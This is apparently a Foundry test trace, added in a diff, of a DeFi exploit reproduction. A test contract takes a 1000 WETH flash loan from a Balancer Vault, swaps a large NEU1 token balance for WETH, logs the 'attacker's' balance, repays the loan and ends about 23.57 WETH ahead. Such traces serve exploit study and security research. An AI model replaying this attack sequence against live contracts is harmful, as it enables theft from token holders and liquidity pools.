+    │   │   │   ├─ emit Approval(owner: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xc873fEcbd354f5A56E00E710B90EF4201db2448d, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x27e292b0c8edbbacd8429313c9ff8a6a0ba1701073ddb2c5416598c8ec767306: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [39923] 0xc873fEcbd354f5A56E00E710B90EF4201db2448d::swapExactTokensForTokensSupportingFeeOnTransferTokens(68157547064697183305504 [6.815e22], 0, [0x6609BE1547166D1C4605F3A243FDCFf467e600C3, 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1690921774 [1.69e9])
+    │   │   │   ├─ [5986] 0x6609BE1547166D1C4605F3A243FDCFf467e600C3::transferFrom(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4, 68157547064697183305504 [6.815e22])
+    │   │   │   │   ├─ emit Transfer(from: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4, value: 68157547064697183305504 [6.815e22])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000000e6ed3f9c52e5b987f20 → 0
+    │   │   │   │   │   @ 0x48ec72f1eedca31ea814a8d1aa2e931df34fcfb52840ce1d7dcc0c2033d23e7e: 0x0000000000000000000000000000000000000000000039c235e2ad36a581b8b6 → 0x00000000000000000000000000000000000000000000483109dc7265011a37d6
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [1296] WETH::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 1012951466767121047078 [1.012e21]
+    │   │   │   │   └─ ← [Return] 1012951466767121047078 [1.012e21]
+    │   │   │   ├─ [529] 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 272757440730148393564342 [2.727e23], 53253535861614750667 [5.325e19], 300, 300
+    │   │   │   ├─ [760] 0x6609BE1547166D1C4605F3A243FDCFf467e600C3::balanceOf(0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4) [staticcall]
+    │   │   │   │   └─ ← [Return] 340914987794845576869846 [3.409e23]
+    │   │   │   ├─ [1716] 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4::getAmountOut(68157547064697183305504 [6.815e22], 0x6609BE1547166D1C4605F3A243FDCFf467e600C3) [staticcall]
+    │   │   │   │   └─ ← [Return] 10621161733405969932 [1.062e19]
+    │   │   │   ├─ [21443] 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4::swap(0, 10621161733405969932 [1.062e19], CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x, CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   ├─ [4200] WETH::transfer(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10621161733405969932 [1.062e19])
+    │   │   │   │   │   ├─ [3454] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10621161733405969932 [1.062e19]) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4, to: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10621161733405969932 [1.062e19])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0x000000000000000000000000000000000000000000000036e986882d8526de26 → 0x0000000000000000000000000000000000000000000000377cec7a8042c96c32
+    │   │   │   │   │   │   │   @ 0x611ad35fad69abd42556d08df0afe8fb76a5e82fe37a40922f3fe174f0b1e40f: 0x000000000000000000000000000000000000000000000002e30a90b78112abcb → 0x0000000000000000000000000000000000000000000000024fa49e64c3701dbf
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [760] 0x6609BE1547166D1C4605F3A243FDCFf467e600C3::balanceOf(0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 340914987794845576869846 [3.409e23]
+    │   │   │   │   ├─ [1296] WETH::balanceOf(0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4) [staticcall]
+    │   │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 42632374128208780735 [4.263e19]
+    │   │   │   │   │   └─ ← [Return] 42632374128208780735 [4.263e19]
+    │   │   │   │   ├─ [479] 0x6EcCab422D763aC031210895C81787E87B43A652::referrersFeeShare(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [760] 0x6609BE1547166D1C4605F3A243FDCFf467e600C3::balanceOf(0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 340914987794845576869846 [3.409e23]
+    │   │   │   │   ├─ emit Sync(reserve0: 340914987794845576869846 [3.409e23], reserve1: 42632374128208780735 [4.263e19])
+    │   │   │   │   ├─ emit Swap(sender: 0xc873fEcbd354f5A56E00E710B90EF4201db2448d, amount0In: 68157547064697183305504 [6.815e22], amount1In: 0, amount0Out: 0, amount1Out: 10621161733405969932 [1.062e19], to: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 8: 0x012c012c000000000002e30a90b78112abcb0000000039c235e2ad36a581b8b6 → 0x012c012c0000000000024fa49e64c3701dbf00000000483109dc7265011a37d6
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [1296] WETH::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 1023572628500527017010 [1.023e21]
+    │   │   │   │   └─ ← [Return] 1023572628500527017010 [1.023e21]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("swap token [NEU1,WETH]") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [1296] WETH::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 1023572628500527017010 [1.023e21]
+    │   │   │   └─ ← [Return] 1023572628500527017010 [1.023e21]
+    │   │   ├─ [0] console::log("Attacker's WETH token balance: ", 1023572628500527017010 [1.023e21]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [529] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 9732096076054987534 [9.732e18], 24967551695756103865059 [2.496e22], 300, 300
+    │   │   ├─ [0] console::log("LP0 reserve0 amount: ", 9732096076054987534 [9.732e18]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("LP0 reserve1 amount: ", 24967551695756103865059 [2.496e22]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [529] 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 340914987794845576869846 [3.409e23], 42632374128208780735 [4.263e19], 300, 300
+    │   │   ├─ [0] console::log("LP1 reserve0 amount: ", 340914987794845576869846 [3.409e23]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("LP1 reserve1 amount: ", 42632374128208780735 [4.263e19]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [4200] WETH::transfer(Vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 1000000000000000000000 [1e21])
+    │   │   │   ├─ [3454] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(Vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 1000000000000000000000 [1e21]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], value: 1000000000000000000000 [1e21])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x8e136277087394ae84bd88b3538db688c3763bf01dc7ed78e5235dc311d5959c: 0x0000000000000000000000000000000000000000000002321a183e0505bda285 → 0x0000000000000000000000000000000000000000000002684fe1ebcae45da285
+    │   │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0x0000000000000000000000000000000000000000000000377cec7a8042c96c32 → 0x0000000000000000000000000000000000000000000000014722ccba64296c32
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [0] console::log("refund flashloan") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [1296] WETH::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 23572628500527017010 [2.357e19]
+    │   │   │   └─ ← [Return] 23572628500527017010 [2.357e19]
+    │   │   ├─ [0] console::log("Attacker's WETH token balance: ", 23572628500527017010 [2.357e19]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   ├─ [1296] WETH::balanceOf(Vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
+    │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(Vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [delegatecall]
+    │   │   │   └─ ← [Return] 11368950490460487262853 [1.136e22]
+    │   │   └─ ← [Return] 11368950490460487262853 [1.136e22]
+    │   ├─ emit FlashLoan(recipient: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], token: WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], amount: 1000000000000000000000 [1e21], feeAmount: 0)
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 17.01s (15.39s CPU time)
+
+Ran 1 test suite in 24.30s (17.01s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
